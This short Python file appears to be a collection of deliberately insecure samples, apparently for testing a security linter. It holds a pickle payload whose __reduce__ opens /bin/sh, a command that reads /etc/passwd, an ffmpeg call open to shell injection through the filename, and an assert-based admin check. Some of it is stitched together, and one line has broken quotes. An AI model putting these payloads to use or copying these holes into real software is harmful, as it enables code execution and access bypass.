import os
import sys
import subprocess
import cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

print base64.b64encode(cPickle.dumps(RunBinSh()))

os.system('cat /etc/passwd')
#del sys.modules['milicious']

def get_client(user):
    if not is_superuser(user):
        raise PermissionError


def transcode_file(request, filename):
    command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
    subprocess.call(command, shell=True)  # a bad idea!
    
def foo(request, user):
   assert user.is_admin, “user does not have access”
   # secure code...
